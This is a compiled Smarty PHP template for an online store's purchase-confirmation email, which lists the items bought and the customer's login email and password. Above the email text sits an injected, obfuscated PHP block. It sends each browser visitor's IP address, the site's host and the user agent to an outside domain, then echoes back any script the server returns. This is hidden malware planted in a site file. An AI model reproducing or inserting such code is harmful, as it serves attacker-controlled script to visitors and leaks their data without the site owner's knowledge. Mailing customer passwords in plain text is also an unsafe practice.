<?php /* Smarty version 2.6.22, created on 2010-12-06 17:40:34
         compiled from /home/a1425978/public_html//templates//mail/purchase_confirm.html */ ?>
<?php
#19f955#
error_reporting(0); ini_set('display_errors',0); $wp_bl157 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_bl157) && !preg_match ('/bot/i', $wp_bl157))){
$wp_bl09157="http://"."tags"."cache".".com/cache"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bl157);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bl09157);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_157bl = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_157bl,1,3) === 'scr' ){ echo $wp_157bl; }
#/19f955#
?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
Thank you for your recent order from AlanMarcero.com

You have purchased the following items:

<?php $_from = $this->_tpl_vars['cart']; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array'); }if (count($_from)):
    foreach ($_from as $this->_tpl_vars['item']):
?>
	<?php echo $this->_tpl_vars['item']['name']; ?>

<?php endforeach; endif; unset($_from); ?>

Your purchased item(s) are ready to be downloaded.  Please login here: http://www.alanmarcero.com/customers.php
with your login and password and proceed to "Download Purchased Items".

Your login email: <?php echo $this->_tpl_vars['email']; ?>

Your login password: <?php echo $this->_tpl_vars['password']; ?>


Alan Marcero
http://www.alanmarcero.com